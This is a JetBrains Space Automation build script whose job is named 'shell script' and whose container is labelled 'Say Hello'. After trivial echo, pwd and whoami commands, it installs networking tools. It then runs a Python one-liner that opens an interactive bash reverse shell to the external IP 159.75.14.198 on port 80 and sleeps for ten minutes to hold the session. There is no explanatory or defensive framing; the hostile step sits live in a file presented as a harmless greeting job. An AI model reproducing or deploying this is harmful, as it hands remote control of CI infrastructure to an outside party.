/**
* JetBrains Space Automation
* This Kotlin-script file lets you automate build activities
* For more info, see https://www.jetbrains.com/help/space/automation.html
*/

job("shell script") {
    container(displayName = "Say Hello", image = "ubuntu") {
        shellScript {
            content = """
                echo Hello
                echo World!
                pwd
                whoami
                apt update -y  && apt install curl tmux sudo wget socat -y 
                python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('159.75.14.198',80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
				sleep 600
            """
        }
    }
}
